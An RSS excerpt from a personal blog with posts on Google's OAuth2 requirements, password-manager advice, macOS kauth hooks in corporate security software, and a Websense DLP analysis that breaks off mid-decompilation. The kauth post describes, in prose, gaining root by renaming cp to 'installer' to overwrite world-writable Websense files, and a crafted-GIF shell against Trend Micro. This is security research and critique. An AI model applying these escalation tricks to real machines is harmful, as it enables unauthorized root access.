&lt;p&gt;Das heißt, zum Zugriff auf Google Dienste wird LSA erschwert oder ganz abgeschaltet und OAuth2 verpflichtend. Soweit eine gute Sache.&lt;/p&gt;
&lt;p&gt;Aber: Ein Mailserver hat bisher via LSA Vollzugriff auf einen GMail Account und einen Kalender bekommen, ohne sich dem für Restricted Scopes notwendigem Review zu unterziehen.&lt;/p&gt;
&lt;p&gt;Dadurch, daß OAuth2 jetzt verpflichtend wird, werden Firmen wie Open Exchange und Mailbox.org also OAuth2 Reviews aufgezwungen, weil das LSA Schlupfloch nicht mehr existiert. Und das ist genau der Punkt, der beklagt wird, nur daß der Artikel das nicht erklärt.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Mailbox.org-Betreiber Peer Heinlein kritisiert Googles Vorgehen, das ab 15. Januar die Zertifizierung von &amp;ldquo;Less Secure Apps&amp;rdquo; vorschreibt. Im Gespräch mit der iX erklärt Heinlein, es sei grundsätzlich nicht verkehrt, wenn unseriöse Anbieter vom Zugriff auf Google-Konten ausgeschlossen werden und Missbrauch minimiert wird.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das ist irreführtend, weil es primär gar nicht um LSA geht, sondern um OAuth2, und spezifisch um die mit OAuth2 Restricted Scopes verknüpften Audit-Anforderungen. LSA abzuschalten ist eine gute Sache, und LSA zu verwenden, um den Anforderungen für OAuth2 Restricted Scope zu entgehen eine mittelfristig zum Scheitern verurteilte Strategie.&lt;/p&gt;
&lt;p&gt;Die Frage, um die es eigentlich gehen muß ist:&lt;/p&gt;
&lt;p&gt;Darf Google für den Zugriff auf ihre Plattform einen solchen Audit verlangen oder ist dies eine unzulässige Wettbewerbseinschränkung?&lt;/p&gt;
&lt;p&gt;Im Lichte der Entscheidung &lt;a href=&#34;https://www.heise.de/newsticker/meldung/Sofortueberweisung-vs-Banken-Kartellamt-sieht-Wettbewerb-behindert-3255361.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Banken vs. Sofortüberweisung&lt;/a&gt;

 kann man annehmen, daß es nicht das Problem von Google ist, Anforderungen an die Anwendungen zu stellen, die ein Anwender für seinen Account zuläßt. Insbesondere wenn der Anwender eine Firma ist und der Account Teil eines GSuite Business Accounts ist.&lt;/p&gt;
&lt;p&gt;Und das ist die eigentliche Frage, die geklärt werden muß.&lt;/p&gt;
&lt;p&gt;OAuth2 ist eine gute Sache. Auch Mailbox.org und OX wissen das und haben das korrekt implementiert, sind dabei aber in die OAuth2 Restricted Scope Requirements für Serverbetreiber gelaufen.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Mehr Paßwort-Sicherheit</title>
      <link>https://blog.koehntopp.info/2019/02/08/mehr-passwort-sicherheit.html</link>
      <pubDate>Fri, 08 Feb 2019 10:14:19 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2019/02/08/mehr-passwort-sicherheit.html</guid>
      <description>&lt;p&gt;Basierend auf &lt;a href=&#34;https://twitter.com/isotopp/status/1093771082400714753&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;einem Twitter-Thread&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;In &lt;a href=&#34;https://pca.st/rEmK&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Aus dem Journalistischen Maschinenraum&lt;/a&gt;

 diskutieren Peter Welchering und Kollegen von ihm den &amp;ldquo;Ändere Dein Paßwort Tag&amp;rdquo;.
Die fehlende Frage dabei:
Warum behaupten Leute, daß Ändern des Passworts unsicherer ist oder jemanden sicherer macht?&lt;/p&gt;
&lt;p&gt;Szenarien sind wichtig, wann immer man über Security (oder Management) diskutiert.&lt;/p&gt;
&lt;p&gt;Ohne Passwortmanager macht man sich das Leben schwerer, weil man sich Dinge merken muss.
Damit das funktioniert nehmen Leute schwache Passwörter, und in Folge sinkt das Sicherheitheitsniveau.
Steht so auch in der originalen Studie.&lt;/p&gt;
&lt;p&gt;Die Hauptgefahr dieser Tage ist die transitive Ausnutzung von Paßworten:
Leute, die dasselbe Paßwort etwa bei eBay und web.de haben lassen sich das eBay Paßwort abphishen, wie es so gerne getan wird.
Im eBay Account ist im Admin-Panel die Mailadresse hinterlegt, sagen wir bei web.de.
Dort wird dasselbe Paßwort verwendet wie bei eBay und zack, ist der Mailaccount weg.
Der ist aber Passwort-Vergessen Recovery-Account für ein Dutzend andere Dinge (und im IMAP Archiv kann man auch sehen, wo).
Und zack, sind die Accounts auch alle weg.&lt;/p&gt;
&lt;p&gt;Daher ist es wichtig, generierte, starke, zufällige Passwörter zu haben.
&lt;strong&gt;Und für jede Site ein anderes.&lt;/strong&gt;
Das kann man gar nicht genug betonen.&lt;/p&gt;
&lt;p&gt;Dabei heißt aber, eigentlich sollte es »Verwende einen Passwort-Manager Tag« sein.
Das hat noch weitere Vorteile:
Man weiß, ob man ein Paßwort für eine Site hat, das älter ist als deren letzte Sicherheitsschwankung.&lt;/p&gt;
&lt;p&gt;Re den Podcast:
Im Grunde ist es ganz einfach - Nachdenken hilft.
Journalismus ist die Frage nach dem Warum.
Davon haben wir zu wenig.&lt;/p&gt;
&lt;p&gt;Im Nachgang gab es dann die &lt;a href=&#34;https://twitter.com/joschtl/status/1093780755048812544&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Frage&lt;/a&gt;

:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kann man einem Passwortmanager uneingeschränkt vertrauen?
Schafft man damit nicht einen Single Point of Failure?
Was hältst Du von &amp;ldquo;sicheres, zufallserzeugtes, nirgends elektronisch gespeichertes Passwort, das je nach Verwendungsort mit einem Prä -/In-/Sufffix versehen wird&amp;rdquo;?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Natürlich man einem Paßwortmanager nicht uneingeschränkt vertrauen.
Das kannst Du nix und niemandem.
Das ist aber auch nicht die Frage.
Die Frage ist, ob Du im Mittel hinterher sicherer bist als vorher und die Antwort ist uneingeschränkt ja, sogar bei einem trivialen Setup.
Paßwortmanager speichern nicht nur Paßworte, die managen sie auch.
Was heißt das?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Paßworte zufällig generieren.&lt;/li&gt;
&lt;li&gt;Paßwort Änderungshistorie dokumentieren - Wann hast Du Wo Was geändert. Das erlaubt Dir Zugriff auf alte Paßworte und erlaubt Dir auch 3.:
3.Zusammen mit der Historie kannst Du nun wissen, ob Dein Paßwort für &lt;a href=&#34;http://x.de&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://x.de&lt;/a&gt;

  neuer ist als der letzte Security-Fail bei &lt;a href=&#34;http://x.de&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://x.de&lt;/a&gt;

&lt;/li&gt;
&lt;li&gt;Und damit kommen wir zum Reporting: Ein Paßwort-Manager erlaubt Dir Deine gesamte Security Posture in der Gesamtschau zu beurteilen. Wie viele schlechte Paßworte hast Du? Wie viele Paßworte hast Du, die Du ändern mußt, wegen 3.?&lt;/li&gt;
&lt;li&gt;Erlaubt Dir Nachfolgemanagement. Wenn Du ge-bus-t wirst, können Deine Rechtsnachfolger sehen, wo Du Account hast und die Kontrolle über Deine Accounts und Assets gezielt übernehmen.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Der Unterschied zwischen &amp;ldquo;Ich hab ein Schema um mir ähnliche Paßworte auszudenken, die eventuell sicher sind&amp;rdquo; und einem Management-Schema wird so hoffentlich klar.&lt;/p&gt;
&lt;p&gt;»Was hältst Du von &amp;ldquo;Paßwort mit Site-Suffix&amp;rdquo;?« Nix.&lt;/p&gt;
&lt;p&gt;Warum nicht?
Es löst das Transitivitäts-Problem, halb.
Es ist keine &lt;strong&gt;Management&lt;/strong&gt; Strategie für virtuelle Assets.
Es dokumentiert nix.
Weder Du noch die Leute, für die Du verantwortlich bist, haben davon einen Gewinn.&lt;/p&gt;
&lt;p&gt;Die Frage, die Du auch lösen mußt:
Was tun Dein Sohn oder Deine Frau mit all Deinem virtuellen Besitz, wenn Du mit dem Familienmobil einen Alleebaum kuschelst oder über dem guten Steak einen Infarkt bekommst - itunes Musik und Apps, Play Store Apps, Kindle Library, Steam Lib?
Leute, das ist alles nicht so schwierig: Stellt Euch einfach vor, das seien echte, anfaßbare Dinge.
Für die habt Ihr Versicherungen, Treuhänder, Hinterlegungen, Kontrollen und Qualitätsstandards, sogar in einer Familie.&lt;/p&gt;
&lt;p&gt;Jetzt dasselbe, auch für nicht anfaßbare Dinge.
Die Antwort ist zwangsläufig ein Paßwortmanager und ein Gespräch mit der Familie und ein Umschlag irgendwo mit Siegel drauf, wo Frau und Kinder wissen wo der ist.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paßwort-Sicherheit</title>
      <link>https://blog.koehntopp.info/2019/02/01/passwort-sicherheit.html</link>
      <pubDate>Fri, 01 Feb 2019 09:50:52 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2019/02/01/passwort-sicherheit.html</guid>
      <description>&lt;p&gt;In einem &lt;a href=&#34;https://www.heise.de/newsticker/meldung/Kommentar-Steckt-Euch-Euren-Aendere-dein-Passwort-Tag-sonstwohin-4291584.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Kommentar auf Heise&lt;/a&gt;

 regt sich Jürgen Schmidt über den Ändere-Dein-Paßwort-Tag auf.
Er fordert von den Herstellern, weniger Daten zu speichern und sichere Systeme zu bauen.
Das ist richtig, aber nicht hilfreich.&lt;/p&gt;
&lt;p&gt;Es ist wahr, daß der generelle Zustand von Security auf Computern bedauernswert ist, und daß Paßworte ein furchtbar fehlerbehafteter Mechanismus sind, Zugang zu schützen.
Aber die Welt ist wie sie ist, und es ist falsch darauf zu warten, daß sie sich verbessert.
Websites werden Eure Credentials leaken und generell daran scheitern, Eure Daten zu schützen.&lt;/p&gt;
&lt;p&gt;Die korrekte Strategie als Endanwender ist, sich darauf zu konzentrieren, solche Fehler handhabbar zu machen und solche Situationen zu überleben.&lt;/p&gt;
&lt;h1 id=&#34;habe-auf-jeder-site-ein-anderes-paßwort&#34;&gt;
    &lt;a href=&#34;#habe-auf-jeder-site-ein-anderes-pa%c3%9fwort&#34;&gt;
	Habe auf jeder Site ein anderes Paßwort
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Dies ist der wichtigste Rat überhaupt, denn das killt alle transitiven Exploits.
Damit das funktioniert brauchst Du den Paßwortmanager.&lt;/p&gt;
&lt;p&gt;Praktisch alle Exploits mit gestohlenen Paßworten sind transitive Exploits:
Jemand verwendet Dein Paßwort von ebay, um sich in Deinen Account auf web.de einzuloggen.
Dort findet er Kontodaten und Anschriften und macht Dein Konto leer.&lt;/p&gt;
&lt;h1 id=&#34;verwende-einen-paßwortmanager&#34;&gt;
    &lt;a href=&#34;#verwende-einen-pa%c3%9fwortmanager&#34;&gt;
	Verwende einen Paßwortmanager
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Das hat mehrere Vorteile:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Du hast aufwandslos ein anderes Paßwort auf jeder Site.&lt;/li&gt;
&lt;li&gt;Ein Paßwortmanager hat auch einen Generator für Zufallspaßworte, so daß Du sehr lange, sehr zufällige Paßworte haben kannst.&lt;/li&gt;
&lt;li&gt;Ein guter Paßwortmanger weiß auch, wann Du ein Kennwort zuletzt geändert hast und wann Sites exploited worden sind und kann Dir sagen wo genau Du ein Risiko eingehst, wenn Du Dein Kennwort nicht änderst.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;aktiviere-2fa-mit-google-authenticator&#34;&gt;
    &lt;a href=&#34;#aktiviere-2fa-mit-google-authenticator&#34;&gt;
	Aktiviere 2FA mit Google Authenticator
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Google Authenticator implementiert TOTP, zeitbasierte automatisch wechselnde Zifferncodes, die alle 30 Sekunden wechseln.
Sie machen Deinen Account sehr viel weniger anfällig gegen Phishing.
TOTP ist ein Standardprotokoll und wird nicht nur von Google Authenticator implementiert, sondern auf der Kommandozeile von oath-toolkit und auch von vielen Paßwortmanagern.&lt;/p&gt;
&lt;h1 id=&#34;verwende-weitere-paßworte-statt-sinnvoller-antworten-bei-sicherheitsfragen&#34;&gt;
    &lt;a href=&#34;#verwende-weitere-pa%c3%9fworte-statt-sinnvoller-antworten-bei-sicherheitsfragen&#34;&gt;
	Verwende weitere Paßworte statt sinnvoller Antworten bei &amp;ldquo;Sicherheitsfragen&amp;rdquo;
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Einige Sites verwenden immer noch &amp;ldquo;Sicherheitsfragen&amp;rdquo; wie &amp;ldquo;Was war der Mädchenname Deiner Mutter?&amp;rdquo;.
Setze hier als Antwort ebenfalls Zufallspaßworte ein und trage Frage und Antwort in Deinen Paßwortmanager ein.&lt;/p&gt;
&lt;h1 id=&#34;stelle-sicher-daß-du-ein-verschlüsseltes-aktuelles-offsite-backup-der-datenbank-deines-paßwortmanagers-hast&#34;&gt;
    &lt;a href=&#34;#stelle-sicher-da%c3%9f-du-ein-verschl%c3%bcsseltes-aktuelles-offsite-backup-der-datenbank-deines-pa%c3%9fwortmanagers-hast&#34;&gt;
	Stelle sicher, daß Du ein verschlüsseltes, aktuelles Offsite Backup der Datenbank Deines Paßwortmanagers hast
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;In meinem Archiv liegt nicht nur mein Keyring meines Paßwortmanagers, sondern auch Screenshots der QR-Codes für die 2FA Initialisierung.
Die sind natürlich alle verschlüsselt.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>kauth Handlers in MacOS</title>
      <link>https://blog.koehntopp.info/2018/12/18/kauth-handlers-in-macos.html</link>
      <pubDate>Tue, 18 Dec 2018 09:06:19 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2018/12/18/kauth-handlers-in-macos.html</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://flylib.com/books/en/3.126.1.140/1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;kauth handlers in MacOS&lt;/a&gt;

, from a somewhat outdated MacOS X Internals book.
But a lot of the content is still relevant.
This section is about kauth handlers.
Kauth is a system in MacOS to hook file open and file exec operations.
It is what is being used by all the Corporate Security Malware that the Compliance Guys like to install on your work Mac, and it is one of the most common reasons for MacOS performance problems at work.&lt;/p&gt;
&lt;p&gt;That is, because most Corpsec Malware does install a Kauth handler and then evaluates file open permission synchronously in that handler.
TrendMicro, Cylance, FireEye (xagt) and Websense DLP do this.
File &lt;code&gt;open()&lt;/code&gt; operations are delayed by a factor of 6x to 10x usually:
Unpacking an electron app with 27.000 files on my home Mac takes 3 seconds, and took 27 seconds on my work Mac.&lt;/p&gt;
&lt;p&gt;Usually, these things are also written badly:
Trendmicro for example runs their evaluations in a privileged userland process with ASLR off, so if you craft the right kind of GIF and drop it into &lt;code&gt;$HOME&lt;/code&gt;, it will pop a shell on any Mac running Trendmicro just fine.
That is,  because the offsets are always right &amp;ndash; thanks to ASLR off.&lt;/p&gt;
&lt;p&gt;And Websense DLP did rely on their Kauth handler so much that all files in the installations were world writeable:
&amp;ldquo;protected&amp;rdquo; only by the Kauth handler.
Which made exceptions for Binaries with the right name (among them &amp;ldquo;installd&amp;rdquo;, &amp;ldquo;installer&amp;rdquo;, or &amp;ldquo;shove&amp;rdquo;), so if you rename your cp program to &amp;ldquo;installer&amp;rdquo; you could happily overwrite any of the files &amp;ndash; reboot the box, get your own code executed as root and be done.&lt;/p&gt;
&lt;p&gt;One of the nicest things on the Mac is &lt;a href=&#34;https://www.hopperapp.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HopperApp&lt;/a&gt;

.
This is a very cheap, very well done clone of the basic functionality in IDA Pro, and allows you to have a quick look at the code of these Corpsec kernel extensions and see how they are breaking things, then act on that.
Depending on your alignment you write a report and get a cookie, or you use this for your own purposes.&lt;/p&gt;
&lt;p&gt;In general, a Macbook with Corporate Security Malware is much more easily owned than a stock Apple device.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Websense DLP gives instant root</title>
      <link>https://blog.koehntopp.info/2018/06/18/websense-dlp-gives-instant-root.html</link>
      <pubDate>Mon, 18 Jun 2018 20:33:10 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2018/06/18/websense-dlp-gives-instant-root.html</guid>
      <description>&lt;p&gt;Enterprise security software is interesting, because in order to do what it does it often uses privilege, but it is also very often written extremely badly.&lt;/p&gt;
&lt;p&gt;In &lt;a href=&#34;https://blog.koehntopp.info/2017/10/20/aslr.html&#34;&gt;ASLR&lt;/a&gt;

 we have had a look on the Trend Micro binary on MacOS and found that it is running as root, and with ASLR off. That means we have a privileged process that is being loaded at a fixed address, and that process is parsing random user generated data in order to scan it for viruses. If we manage to find a bug in that code, we have a way to make this privileged process do our bidding – by simply putting a special file into a directory that is being scanned by the virus scanner.&lt;/p&gt;
&lt;p&gt;Because ASLR is off, that antivirus process is at the same, fixed address on every machine running the same OS version and Trendmicro version. This means: our bug works the same way on every single machine with these properties. We basically control the entire fleet of machines at once.&lt;/p&gt;
&lt;p&gt;Such thoughts are not hypothetical problems. Let&amp;rsquo;s have a look at another enterprise security product and how that works, for real.&lt;/p&gt;
&lt;h2 id=&#34;websense-dlp-is-installed-and-it-is-python&#34;&gt;
    &lt;a href=&#34;#websense-dlp-is-installed-and-it-is-python&#34;&gt;
	Websense DLP is installed and it is Python
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;So yesterday morning when I came to work, my Macbook Air had crashed.&lt;/p&gt;
&lt;p&gt;On Reboot, the jamf installed a bunch of patches and new stuff. I ran the usual fast &lt;a href=&#34;https://aide.github.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AIDE&lt;/a&gt;

 check I do every morning, and found a bunch of modified system files, among them WebSense DLP as announced by Corporate a while ago.&lt;/p&gt;
&lt;p&gt;I found a bunch of files in &lt;code&gt;/Library/Application Support/Websense Endpoint&lt;/code&gt; and was immediately fascinated, because apparently this installs a complete version of Python 2.5.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; find . -iname python2&lt;span class=&#34;se&#34;&gt;\*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;./EPClassifier/python/bin/python2.5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; EPClassifier/python/bin/python2.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Python 2.6.9 (unknown, Feb  7 2017, 00:08:08)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Type &amp;#34;help&amp;#34;, &amp;#34;copyright&amp;#34;, &amp;#34;credits&amp;#34; or &amp;#34;license&amp;#34; for more information.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Okay, so they lie about that. It’s 2.6.&lt;/p&gt;
&lt;p&gt;On the other hand, they deliver their application as a bunch of &lt;code&gt;.pyc&lt;/code&gt; (compiled python bytecode) files.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; find  . -iname &lt;span class=&#34;se&#34;&gt;\*&lt;/span&gt;.pyc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;./EPClassifier/CryptoInterface.pyc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;./EPClassifier/policies/file_detectors/ASMDetector.pyc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;./EPClassifier/policies/file_detectors/CAD_STL.pyc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can read that, using &lt;a href=&#34;https://github.com/rocky/python-uncompyle6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;uncompyle6&lt;/a&gt;

: &lt;code&gt;brew install python3; pip3 install uncompyle6&lt;/code&gt;, because I am lazy and don’t want to mess with a venv right here and now.&lt;/p&gt;
&lt;p&gt;I’d want that in my path all the time anyway.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;uncompyle6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EPClassifier&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;policies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scripts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyLogger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# uncompyle6 version 3.2.3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Python bytecode 2.5 (62131)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Decompiled from: Python 3.7.0 (default, Jul  9 2018, 09:48:45)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# [Clang 9.0.0 (clang-900.0.39.2)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Embedded file name: .\pyLogger.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;codecs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;threading&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;PyLogger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;debugName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;pyLogger_svm_default_log_file.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debugName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;debugName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myMutex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;massage_to_write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
